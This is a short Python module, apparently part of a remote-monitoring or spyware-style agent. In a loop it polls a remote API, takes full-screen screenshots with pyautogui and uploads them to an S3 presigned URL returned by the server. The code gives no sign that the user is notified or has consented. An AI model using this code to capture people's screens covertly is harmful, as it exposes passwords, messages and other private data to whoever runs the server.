import os
import threading
from time import sleep

import pyautogui
import requests


class Screenshots(threading.Thread):

    def __init__(self, api: str, key: str):
        super().__init__()
        self.name = "Screenshots"
        self.api = api
        self.key = key

    def run(self):
        while True:
            try:
                response = requests.get("https://" + self.api + "/screenshot",
                                        headers={"x-api-key": self.key})
                if response.ok and "Disabled" not in response.text:
                    # Take screenshots
                    pic = pyautogui.screenshot()
                    # Save the image
                    file_name = 'Screenshots.jpeg'
                    pic.save(file_name)
                    with open(file_name, "rb") as image_file:
                        files = {'file': (file_name, image_file, 'image/jpeg', {'Expires': '0'})}
                        upload = response.json()
                        url = upload['url'].replace("s3.amazonaws.com", "s3-accelerate.amazonaws.com")
                        upload_screenshots = requests.post(url, data=upload['fields'], files=files)
                        print('screen shot uploaded!')
                    os.remove(file_name)

            except Exception as e:
                print(e)
            sleep(55)
